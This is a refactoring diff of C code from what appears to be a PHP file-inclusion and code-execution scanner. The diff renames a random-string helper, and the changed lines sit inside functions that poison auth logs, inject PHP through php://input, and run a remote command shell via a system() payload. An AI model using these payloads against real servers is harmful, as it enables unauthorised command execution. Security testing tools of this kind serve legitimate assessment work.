@@ -57,7 +57,7 @@ void build_rce_exploit(CURL *curl, const char *url, const char *pname,
 
 
 bool check_auth_poison(const char *target){
-    char *phpcode, rstr[R_SIZE], regex[VULN_SIZE], rfile[20], *mapfile;
+    char *phpcode, rbuf[R_SIZE], regex[VULN_SIZE], rfile[20], *mapfile;
     bool ret = false;
     int fsize, fd;
     CURL *curl;
@@ -70,9 +70,9 @@ bool check_auth_poison(const char *target){
     curl_easy_setopt(curl, CURLOPT_WRITEDATA, fh);
     curl_easy_setopt(curl, CURLOPT_URL, target);
 
-    random_string(rstr, R_SIZE);
-    concatlb(regex, rstr, "Vulnerable", rstr, NULL);
-    phpcode = make_code(rstr, "<?php echo \"Vulnerable\"; ?>", true);
+    randomstr(rbuf, sizeof(rbuf));
+    concatlb(regex, rbuf, "Vulnerable", rbuf, NULL);
+    phpcode = make_code(rbuf, "<?php echo \"Vulnerable\"; ?>", true);
 
     build_rce_exploit(curl, NULL, NULL, phpcode, AUTH);
 
@@ -229,7 +229,7 @@ int rce_scan(const char *base, struct parameter_list *plist, int p){
         NULL
     };
 
-    char random_str[R_SIZE], regex[VULN_SIZE],
+    char rbuf[R_SIZE], regex[VULN_SIZE],
     *php_code = NULL, *rce_uri = NULL;
 
     int size_file, fd;
@@ -241,9 +241,9 @@ int rce_scan(const char *base, struct parameter_list *plist, int p){
 
     CURL *curl = init_curl(&body);
 
-    random_string(random_str, R_SIZE);
-    concatlb(regex, random_str, "Vulnerable", random_str, NULL);
-    php_code = make_code(random_str, "<?php echo 'Vulnerable'; ?>", false);
+    randomstr(rbuf, sizeof(rbuf));
+    concatlb(regex, rbuf, "Vulnerable", rbuf, NULL);
+    php_code = make_code(rbuf, "<?php echo 'Vulnerable'; ?>", false);
 
     info_single("testing php://input ...\n");
     for(i=0; input_t[i] != NULL; i++){
@@ -548,7 +548,7 @@ void exec_phpcode(const char *url, const char *parameter, const char *code, int 
     chunk = curl_slist_append(chunk, "Connection: close");
     curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
 
-    rce_code = make_code(random_string(rbuf, sizeof(rbuf)), code, (type == AUTH));
+    rce_code = make_code(randomstr(rbuf, sizeof(rbuf)), code, (type == AUTH));
     build_rce_exploit(curl, url, parameter, rce_code, type);
 
     concatlb(regex, rbuf, "(.*)", rbuf, NULL);
@@ -582,7 +582,7 @@ void rce_http_shell(const char *url, const char *parameter, int technique){
 
     struct request body;
     CURL *curl;
-    char randomstr[R_SIZE], regex[56], cmd[512], random_file[20];
+    char rbuf[R_SIZE], regex[56], cmd[512], random_file[20];
 
     void *bodyptr;
     ssize_t nbytes;
@@ -598,8 +598,8 @@ void rce_http_shell(const char *url, const char *parameter, int technique){
 
     curl_easy_setopt(curl, CURLOPT_URL, url);
 
-    random_string(randomstr, sizeof(randomstr));
-    concatlb(regex, randomstr, "(.*)", randomstr, NULL);
+    randomstr(rbuf, sizeof(rbuf));
+    concatlb(regex, rbuf, "(.*)", rbuf, NULL);
 
     aux = xmalloc(600);
 
@@ -622,7 +622,7 @@ void rce_http_shell(const char *url, const char *parameter, int technique){
             break;
 
         sprintf(aux, "<?php system(\"%s\"); ?>", cmd);
-        phpcode = make_code(randomstr, aux, (technique == AUTH) ? true : false);
+        phpcode = make_code(rbuf, aux, (technique == AUTH) ? true : false);
 
         if(technique != AUTH){
             init_str(&body);
@@ -747,7 +747,7 @@ int disclosure_check(const char *uri, const char *xuri){
 void scan(const char *target){
     char *base_uri = NULL, *parameters = NULL;
     char *source_disc = NULL, *error_uri = NULL;
-    char random_str[R_SIZE];
+    char rbuf[R_SIZE];
 
     int result = 0;
     size_t i = 0;
@@ -796,7 +796,7 @@ void scan(const char *target){
 
         if(!previous_error && plist.parameter[i].value){
             info_all("checking for common error messages\n");
-            error_uri = build_url(base_uri, &plist, i, random_string(random_str, R_SIZE), replace_string);
+            error_uri = build_url(base_uri, &plist, i, randomstr(rbuf, sizeof(rbuf)), replace_string);
             info_all("using random url: %s\n",error_uri);
             result = common_error_check(error_uri);
 
@@ -921,7 +921,7 @@ void *thread_scan(void *url){
     char *target_uri = ((char *) url);
     char *base_uri = NULL, *parameters = NULL;
     char *source_disc = NULL, *error_uri = NULL;
-    char random_str[R_SIZE];
+    char rbuf[R_SIZE];
     struct parameter_list plist = { .len = 0, .parameter = 0, .trash = 0};
 
     int result = 0;
@@ -959,7 +959,7 @@ void *thread_scan(void *url){
             continue;
 
         if(!previous_error && plist.parameter[i].value){
-            error_uri = build_url(base_uri, &plist, i, random_string(random_str, R_SIZE), replace_string);
+            error_uri = build_url(base_uri, &plist, i, randomstr(rbuf, sizeof(rbuf)), replace_string);
             result = common_error_check(error_uri);
 
             //if(result == -1)
